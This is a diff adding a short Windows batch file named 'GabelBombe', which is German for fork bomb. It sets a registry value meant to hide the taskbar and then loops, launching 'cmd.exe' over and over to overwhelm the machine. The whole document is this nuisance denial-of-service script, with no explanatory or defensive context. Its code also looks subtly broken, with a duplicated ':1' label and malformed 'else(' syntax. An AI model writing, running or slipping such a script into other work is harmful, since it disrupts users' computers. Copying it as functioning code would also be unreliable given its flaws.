@@ -1,0 +1,10 @@
+@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarHide" /t REG_SZ /d "1" /f
+:1
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\GabelBombe.bat" (
+  goto 1
+)else(
+  :1
+  start cmd.exe
+  goto 1
+)
